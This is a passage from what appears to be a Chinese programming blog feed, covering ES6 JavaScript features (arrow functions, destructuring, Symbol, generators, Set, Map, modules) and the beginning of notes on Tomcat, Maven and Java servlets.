class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">const fushan = &#123;</span><br><span class="line">    top1: &#x27;shy&#x27;,</span><br><span class="line">    get: function()&#123;</span><br><span class="line">            console.log(&quot;剑姬&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">let &#123;top1, get&#125; = fushan</span><br><span class="line">console.log(top1);</span><br><span class="line">get();</span><br></pre></td></tr></table></figure><p>这里最常用的就是解构对象的方法，直接使用方法名调用</p><h2 id="C4-模板字符串"><a href="#C4-模板字符串" class="headerlink" title="C4.模板字符串"></a>C4.模板字符串</h2><p>主要用于字符串的拼接和简化换行显示</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">let str = `i </span><br><span class="line">           am a </span><br><span class="line">           string`;</span><br><span class="line">console.log(str);</span><br><span class="line">let lovest = &#x27;卡莎&#x27;</span><br><span class="line">let out = `$&#123;lovest&#125; is best`</span><br><span class="line">console.log(out);</span><br></pre></td></tr></table></figure><h2 id="C5-对象简化"><a href="#C5-对象简化" class="headerlink" title="C5.对象简化"></a>C5.对象简化</h2><p>支持简化书写对象</p><p>本来<code>godv</code>对象中需要写成</p><p><code>god：god，</code></p><p><code>oppsite：oppsite</code></p><p>现在省去多余的代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">let god = &#x27;v&#x27;;</span><br><span class="line">let oppsite = function()&#123;</span><br><span class="line">    console.log(`r`);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">const godv = &#123;</span><br><span class="line">    god,</span><br><span class="line">    oppsite,</span><br><span class="line">    improve()&#123;</span><br><span class="line">        console.log(&quot;简化&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="C6-箭头函数"><a href="#C6-箭头函数" class="headerlink" title="C6.箭头函数"></a>C6.箭头函数</h2><p>允许使用箭头定义函数</p><p>函数体基本一致</p><p>主要是声明不一样</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">let great = (a, b) =&gt; &#123;</span><br><span class="line">    console.log(a+b);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而且函数的this不一样，是静态的</p><p>this永远留在函数声明时候的this</p><p>主要是使用call方法调用的时候</p><p><code>call(obj, p, p)</code>，第一个参数是this的指向，其他参数是传入的实参</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">window.name = &#x27;ztdgz&#x27;</span><br><span class="line">let school = &#123;</span><br><span class="line">    name :&quot;swpu&quot;</span><br><span class="line">&#125;</span><br><span class="line">let great = (a, b) =&gt; &#123;</span><br><span class="line">    console.log(this.name);</span><br><span class="line">&#125;</span><br><span class="line">let great2= function()&#123;</span><br><span class="line">    console.log(this.name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">great.call(school);//ztdgz</span><br><span class="line">great2.call(school);//swpu</span><br></pre></td></tr></table></figure><p>箭头函数不能作为构造函数创建实例化对象</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">let person = (name, age) =&gt; &#123;</span><br><span class="line">    this.name = name</span><br><span class="line">    this.age = age</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">let me = new person()</span><br></pre></td></tr></table></figure><p>这样子的代码会报错，显示<code>person is not  a constructor</code></p><p> 而且不能使用<code>arguments</code>变量</p><p><code>arguements</code>对象是对象中用于获取实参类数组的一个对象</p><p>下面代码本来应该获得一个 伪数组 <strong>0号元素是name，1号元素是age</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">     let person = (name, age) =&gt; &#123;</span><br><span class="line">console.log(arguments)</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure><p>也就是说，这样子打印会报错</p><p>还可以省略小括号（当形参有且只有一个的时候）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">     let person = age =&gt; &#123;</span><br><span class="line">console.log(age)</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure><p>省略花括号，（函数体之后一条语句）同时也不能写return语句，return的内容就是后面语句的执行结果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">let pow = n =&gt; n*n;</span><br></pre></td></tr></table></figure><p>这里再介绍一下：<code>_proto_</code></p><h3 id="more：-proto"><a href="#more：-proto" class="headerlink" title="more：_proto_"></a>more：<code>_proto_</code></h3><p><code>_proto_</code>是对象中的一个属性，这个属性指向这个对象的原型也就是prototype</p><p><strong>如果你设置了__proto，就是修改了当前对象的原型链</strong>。</p><ol><li>构造a对象的构造函数是A，那么a.<strong>proto</strong>：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a.__proto__ === A.prototype</span><br></pre></td></tr></table></figure><p>2.A.prototype.__proto呢？可能会有人回答是Function.prototype，A的构造函数不是Function嘛，那可以明确告诉你，A.prototype.__proto__不是指向Function.prototype，而是指向Object.prototype，为啥呢，因为A.prototype，而不是A，A的构造函数是Function，但是A.prototype可不是，它是一个对象，那它的构造函数是Object，所以：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">A.prototype.__proto__ === Object.prototype</span><br></pre></td></tr></table></figure><p>3.然后是一切的尽头，<code>object.prototype._proto_</code></p><p>这个最终指向的是null</p><h2 id="C7-函数参数默认值"><a href="#C7-函数参数默认值" class="headerlink" title="C7.函数参数默认值"></a>C7.函数参数默认值</h2><p>1.函数在形参写入时放入初始值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">let oppsite = function(a,b=10 )&#123;</span><br><span class="line">    console.log(b);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是调用时实参会将默认值顶掉，所以一般默认值放在形参的最后</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">oppsite(10,12)</span><br><span class="line">//此時b=12</span><br></pre></td></tr></table></figure><p>2.写入形参可以结构赋值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">let fun = function (&#123;name, age, sex&#125;) &#123;</span><br><span class="line">    console.log(name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fun(&#123;</span><br><span class="line">    name: &quot;tony&quot;,</span><br><span class="line">    age: &quot;18&quot;,</span><br><span class="line">    sex: &quot;male&quot;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>还有es6加入的rest参数，也就是我们熟悉的<code>...args</code></p><p><img src="https://img-blog.csdnimg.cn/7ca82e1a8c28468f94628ede278934c1.png" alt="rest参数"></p><p>和rest很像的还有一个扩展运算符</p><h3 id="扩展运算符"><a href="#扩展运算符" class="headerlink" title="扩展运算符"></a>扩展运算符</h3><p><img src="https://img-blog.csdnimg.cn/c22b8b9650b7464ab6941e7ffdd5e230.png" alt="扩展运算符"></p><p>不使用<code>...</code>得到的arguments中只有一个参数是一个数组（tfboys）</p><p>使用之后arguments分别得到了数组中的三个元素</p><p>可以实现数组合并</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">let a = [&#x27;a&#x27;,&#x27;b&#x27;]</span><br><span class="line">let b = [&#x27;c&#x27;,&#x27;d&#x27;]</span><br><span class="line">let ab = [...a, ...b]</span><br><span class="line">console.log(ab);//得到 a,b,c,d</span><br></pre></td></tr></table></figure><p>还可以复制数组</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">let d = [...a]</span><br></pre></td></tr></table></figure><p>和伪数组转化为真实数组</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">let divs = document.querySelectorAll(&quot;div&quot;)//querySelector获取到的是伪数组，原型上是object</span><br><span class="line">let divArr = [...divs]</span><br></pre></td></tr></table></figure><h2 id="C8-symbol数据类型"><a href="#C8-symbol数据类型" class="headerlink" title="C8.symbol数据类型"></a>C8.symbol数据类型</h2><p>此中</p><p>s2和s3不相等</p><p>但是Symbol.for得到的两个对象相等（s4 === s5）</p><p><img src="https://img-blog.csdnimg.cn/0dc0adff76474559aa77e08df6327150.png" alt="symbol数据类型"></p><p>Symbol还可以用于给对象添加特定的元素</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">let game = &#123;</span><br><span class="line">    a: 10,</span><br><span class="line">    b: 2</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">let methods = &#123;</span><br><span class="line">    a: Symbol(),</span><br><span class="line">    b: Symbol()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">game[methods.a] = 2</span><br><span class="line">game[methods.b] = 3</span><br></pre></td></tr></table></figure><p>这样子做不会覆盖原先a，b的值，会创建两个新的symbol变量</p><p>或者使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">let game = &#123;</span><br><span class="line">    a: 10,</span><br><span class="line">    b: 2，</span><br><span class="line">    [Symbol(&#x27;a&#x27;)]: 2,</span><br><span class="line">    [Symbol(&#x27;b&#x27;)]: 3,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="迭代器"><a href="#迭代器" class="headerlink" title="迭代器"></a>迭代器</h3><p>es6通过<code>Symbol.iterator</code>支持<code>for...of</code>循环</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">let game = [&#x27;dota&#x27;,&#x27;lol&#x27;,&#x27;cs&#x27;]</span><br><span class="line"></span><br><span class="line">for(let v in game)&#123;</span><br><span class="line">    console.log(v);</span><br><span class="line">&#125;</span><br><span class="line">//结果 dota lol cs</span><br></pre></td></tr></table></figure><p>和<code>for...in</code>很像，但是得到的<strong>是值，不是键</strong></p><p>迭代器的作用远不止于此</p><p>有关生成器函数（异步编程的解决方案）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">   // 生成器函数 使用*作为前缀</span><br><span class="line">   function * gen() &#123;</span><br><span class="line">       console.log(111);</span><br><span class="line">       yield &#x27;一只没有耳朵&#x27;</span><br><span class="line">       console.log(222);</span><br><span class="line">       yield &#x27;一只没有尾巴&#x27;</span><br><span class="line">       console.log(333);</span><br><span class="line">       yield &#x27;真奇怪&#x27;</span><br><span class="line">       console.log(444);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">//gen()其实是一个迭代器对象</span><br><span class="line">   let iterator = gen()</span><br><span class="line">   //使用next()方法执行到下一个代码块</span><br><span class="line">   iterator.next()</span><br><span class="line">   iterator.next()</span><br><span class="line">   iterator.next()</span><br><span class="line">   iterator.next()</span><br></pre></td></tr></table></figure><p>其中yield将函数体分割成了四个部分</p><p>第一次调用next()，执行           </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">console.log(111);</span><br><span class="line">yield &#x27;一只没有耳朵&#x27;</span><br><span class="line">//只会得到 111</span><br></pre></td></tr></table></figure><p>或者使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">for(v of iterator)&#123;</span><br><span class="line">    console.log(v);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//会得到 111 一只没有耳朵</span><br></pre></td></tr></table></figure><p>next函数可以放入参数，next()函数的参数作为上一个yield语句的返回结果（本来是undefined），加了参数之后就是aaa</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">// 生成器函数</span><br><span class="line">function * gen() &#123;</span><br><span class="line">    console.log(111);</span><br><span class="line">    let a = yield &#x27;一只没有耳朵&#x27;</span><br><span class="line">    console.log(a);</span><br><span class="line">    yield &#x27;一只没有尾巴&#x27;</span><br><span class="line">    console.log(333);</span><br><span class="line">    yield &#x27;真奇怪&#x27;</span><br><span class="line">    console.log(444);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">let iterator = gen()</span><br><span class="line">iterator.next()</span><br><span class="line">iterator.next(&#x27;aaa&#x27;)</span><br><span class="line">//此时gen()函数中a的值是aaa</span><br></pre></td></tr></table></figure><h2 id="C9-Set集合"><a href="#C9-Set集合" class="headerlink" title="C9.Set集合"></a>C9.Set集合</h2><p><img src="https://img-blog.csdnimg.cn/d19ae367c4514b70a116d011752200ae.png" alt="集合"></p><p>主要是对于集合的操作和集合的成员唯一性</p><p>集合操作</p><p>主要就是用到了我们上面介绍的方法</p><p><code>has()</code>是其中比较重要的方法</p><p><img src="https://img-blog.csdnimg.cn/a76afbb4713545259c49baa1489ff80c.png" alt="集合操作"></p><p><img src="https://img-blog.csdnimg.cn/30554d7e76824899b75a6f57f0426ce3.png" alt="差集"></p><h2 id="C10-Map"><a href="#C10-Map" class="headerlink" title="C10.Map"></a>C10.Map</h2><p>Map和Set一样，也是es6提出的一种数据结构</p><p><img src="https://img-blog.csdnimg.cn/4ba41433b7c74b659e71f0894d29ab77.png" alt="Map"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">//创建新Map</span><br><span class="line">let m = new Map()</span><br><span class="line"></span><br><span class="line">//键为字符串</span><br><span class="line">m.set(&#x27;name&#x27;,&#x27;swpu&#x27;)</span><br><span class="line"></span><br><span class="line">//键也可以为对象</span><br><span class="line">let key = &#123;</span><br><span class="line">    name:&#x27;swpu&#x27;</span><br><span class="line">&#125;</span><br><span class="line">m.set(key,[&#x27;chengdu&#x27;,&#x27;nanchong&#x27;])</span><br></pre></td></tr></table></figure><p>遍历m的时候会得到一个个的数组，每个数组的第一个元素是键，第二个元素是值</p><h2 id="C11-数值转换"><a href="#C11-数值转换" class="headerlink" title="C11.数值转换"></a>C11.数值转换</h2><h3 id="1-Number-EPSILON"><a href="#1-Number-EPSILON" class="headerlink" title="1.Number.EPSILON"></a>1.Number.EPSILON</h3><p>是js中最小的精度</p><p>比如计算</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">let a = 0.1 + 0.2</span><br><span class="line">let b = 0.3</span><br><span class="line">console.log(a == b);</span><br></pre></td></tr></table></figure><p>打印结果是false，因为a的结果是0.3000…4</p><p>所以我们为了完善这部分，使用一个函数进行判断</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">let eql = function(a,b)&#123;</span><br><span class="line">    if(a-b&lt;Number.EPSILON)&#123;</span><br><span class="line">        return true</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        return false</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-Number-isFinit"><a href="#2-Number-isFinit" class="headerlink" title="2.Number.isFinit"></a>2.Number.isFinit</h3><p>判断一个数字是否为有限数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">console.log(Number.isFinite(100));</span><br></pre></td></tr></table></figure><h3 id="3-Number-isNaN"><a href="#3-Number-isNaN" class="headerlink" title="3.Number.isNaN"></a>3.Number.isNaN</h3><p>判断一个数字是否为NaN</p><h3 id="4-Number-parseInt-Number-parseFloat，Number-isInteger"><a href="#4-Number-parseInt-Number-parseFloat，Number-isInteger" class="headerlink" title="4.Number.parseInt , Number.parseFloat，Number.isInteger"></a>4.Number.parseInt , Number.parseFloat，Number.isInteger</h3><p>用于字符串转换为int和float类型</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">let love = Number.parseInt(&#x27;5211314love&#x27;)</span><br></pre></td></tr></table></figure><p>转换出来的结果是：5211314</p><p><code>Number.isInteger</code>用于判断数值是否为整数</p><h3 id="5-Math-trunc"><a href="#5-Math-trunc" class="headerlink" title="5.Math.trunc"></a>5.Math.trunc</h3><p>用于抹除小数部分</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">let tr = Math.trunc(3.6)</span><br><span class="line">console.log(tr);</span><br></pre></td></tr></table></figure><p>结果为3</p><h3 id="6-Math-sign"><a href="#6-Math-sign" class="headerlink" title="6.Math.sign"></a>6.Math.sign</h3><p>判断一个数值是正数还是负数还是0</p><p>正数输出为1</p><p>0输出为0</p><p>负数输出为-1</p><h2 id="C12-对象方法的扩展"><a href="#C12-对象方法的扩展" class="headerlink" title="C12.对象方法的扩展"></a>C12.对象方法的扩展</h2><p>1.is</p><p><code>Object.is()</code>用于比较两个值相等</p><p>和<code>===</code>不同在于NaN的处理上</p><p>is可以实现<code>Object.is(NaN,NaN) ==&gt; true</code></p><p>2.assign</p><p>两个对象使用assign方法</p><p>相同的属性名称会覆盖</p><p>不同的属性名称会照常显示</p><p><img src="https://img-blog.csdnimg.cn/4635eb8b43f94b9fa28760afc4863e3a.png" alt="对象方法的扩展"></p><p>3.get/setPrototypeOf</p><p>用于设置原型类型和获取原型类型</p><p>如下在使用setPrototypeOf之后：</p><p>school的原型对象变成了cities</p><p>再往上的原型对象才是object</p><p><img src="https://img-blog.csdnimg.cn/85974e0875744dfc8f0d72763da2539b.png" alt="对象扩展2"></p><h2 id="C13-模块化"><a href="#C13-模块化" class="headerlink" title="C13.模块化"></a>C13.模块化</h2><p>模块化使用与将大文件拆分为小文件</p><p>使用export和import进行链接</p><p>需要暴露的代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">export let school = &quot;swpu&quot;</span><br><span class="line"></span><br><span class="line">export function teach() &#123;</span><br><span class="line">    console.log(&quot;learning&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>外部引入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">    &lt;title&gt;Export&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;script type=&quot;module&quot;&gt;</span><br><span class="line">        import * as m1 from &quot;./m1.js&quot;</span><br><span class="line">        console.log(m1);</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>可能会存在跨域问题，可以使用live Server打开</p><p>得到：module模块下的这些参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Module</span><br><span class="line">school: &quot;swpu&quot;</span><br><span class="line">teach: ƒ teach()</span><br><span class="line">Symbol(Symbol.toStringTag): &quot;Module&quot;</span><br><span class="line">get school: ƒ ()</span><br><span class="line">set school: ƒ ()</span><br><span class="line">get teach: ƒ ()</span><br><span class="line">set teach: ƒ ()</span><br></pre></td></tr></table></figure><p>或者使用统一暴露</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> let school = &quot;swpu&quot;</span><br><span class="line"></span><br><span class="line"> function teach() &#123;</span><br><span class="line">    console.log(&quot;learning&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">export&#123;school, teach&#125;</span><br></pre></td></tr></table></figure><p>还有默认暴露，但是默认暴露的数据是封装在module下default对象（Object）下的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">export default &#123;</span><br><span class="line">    school : &quot;swpu&quot;,</span><br><span class="line">    teach: function () &#123;</span><br><span class="line">        console.log(&quot;learning&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>还有引入的方式</p><p><img src="https://img-blog.csdnimg.cn/3ac0df5eea384c418d536c5019fcc753.png" alt="import的方式"></p>]]></content>
    
    
    
    <tags>
      
      <tag>JavaScript</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JavaWeb</title>
    <link href="/2022/08/21/JavaWeb/"/>
    <url>/2022/08/21/JavaWeb/</url>
    
    <content type="html"><![CDATA[<h1 id="Tomcat"><a href="#Tomcat" class="headerlink" title="Tomcat"></a>Tomcat</h1><p>Tomcat用于搭建我们本机的服务器，我们可以部署javaweb项目到Tomcat中，然后其他用于就可以在浏览器中浏览</p><h2 id="1-下载，安装"><a href="#1-下载，安装" class="headerlink" title="1.下载，安装"></a>1.下载，安装</h2><p>我们到Tomcat的官网中下载就可以了 &lt;<a href="https://tomcat.apache.org/">Apache Tomcat® - Welcome!</a>&gt;</p><p>我选择的是8版本，下载压缩包，然后解压就完成了下载和安装</p><p>然后点击<code>bin</code>目录下的<code>startup.bat</code>就可以开始运行，在浏览器中进入本地8080端口就可以看到页面</p><p>如果出现中文乱码，那就在conf文件夹下找到<code>logging.properties</code>这个文件</p><p>更改编码格式：（原为UTF-8）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java.util.logging.ConsoleHandler.encoding = GBK</span><br></pre></td></tr></table></figure><p>打开后可以使用Ctrl+C关闭</p><h2 id="2-基本使用"><a href="#2-基本使用" class="headerlink" title="2.基本使用"></a>2.基本使用</h2><p><img src="https://s2.loli.net/2022/09/04/WycgwUYSbGOfEzk.png" alt="端口.png"></p><p>项目部署的时候直接放在webapps这个目录下就算部署成功，在端口号下输入路径就可以看到</p><p>我们部署项目一般会将文件夹打包成<code>war</code>包的格式，<code>war</code>包放入部署文件夹之后会自动解压缩</p><h2 id="3-项目结构"><a href="#3-项目结构" class="headerlink" title="3.项目结构"></a>3.项目结构</h2><p>web项目结构中主要是增加了webapp这个目录，然后就是WEB-INF中的配置文件。</p><p>然后在pom.xml中需要配置使用war方式打包</p><p><img src="https://s2.loli.net/2022/09/04/IJjv4fVehPNTXFu.png" alt="web项目结构.png"></p><h2 id="4-创建maven项目"><a href="#4-创建maven项目" class="headerlink" title="4.创建maven项目"></a>4.创建maven项目</h2><p>有两种方式</p><p>1.使用骨架</p><p><img src="https://s2.loli.net/2022/09/04/yr98fed5gJ7EFWk.png" alt="骨架创建.png"></p><p>但是会有很多杂项配置，所以不建议使用</p><p>2.不使用骨架</p><p><img src="https://s2.loli.net/2022/09/04/6EgNOZnM45zTmKB.png" alt="非骨架创建.png"></p><p>这样我们的pom.xml文件中的内容就比较清爽，但是需要使用<code>Ctrl+Shift+Alt+s</code>打开facets补齐</p><p>运行时我们也有两种方式</p><p>1.是集成本地的Tomcat，但是较为繁琐</p><p>2.idea为我们提供了插件，我们可以使用插件快捷集成，但是只支持到Tomcat7版本</p><p><img src="https://s2.loli.net/2022/09/04/NmEvZifcIBDr3Mb.png" alt="maven中加入Tomcat.png"></p><h1 id="Servelet"><a href="#Servelet" class="headerlink" title="Servelet"></a>Servelet</h1><p>servelet用于实现对动态资源的管理和响应</p><p>比如我们登录携带的参数，servelet就适用于对于不同的参数进行响应</p><p>serverlet是javaee的规范之一，也就是一个接口</p><h2 id="1-简单使用"><a href="#1-简单使用" class="headerlink" title="1.简单使用"></a>1.简单使用</h2><p><img src="https://s2.loli.net/2022/09/04/8nK3lEHZGeOUN9s.png" alt="简单使用.png"></p><p>首先在<code>pom.xml</code>中加入Tomcat和servelet</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--    servlet依赖--&gt;</span><br><span class="line">    &lt;dependencies&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;javax.servlet&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;javax.servlet-api&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;3.1.0&lt;/version&gt;</span><br><span class="line">            &lt;scope&gt;provided&lt;/scope&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">    &lt;/dependencies&gt;</span><br><span class="line"></span><br><span class="line">&lt;!--    tomcat 插件--&gt;</span><br><span class="line">    &lt;build&gt;</span><br><span class="line">        &lt;plugins&gt;</span><br><span class="line">            &lt;plugin&gt;</span><br><span class="line">                &lt;groupId&gt;org.apache.tomcat.maven&lt;/groupId&gt;</span><br><span class="line">                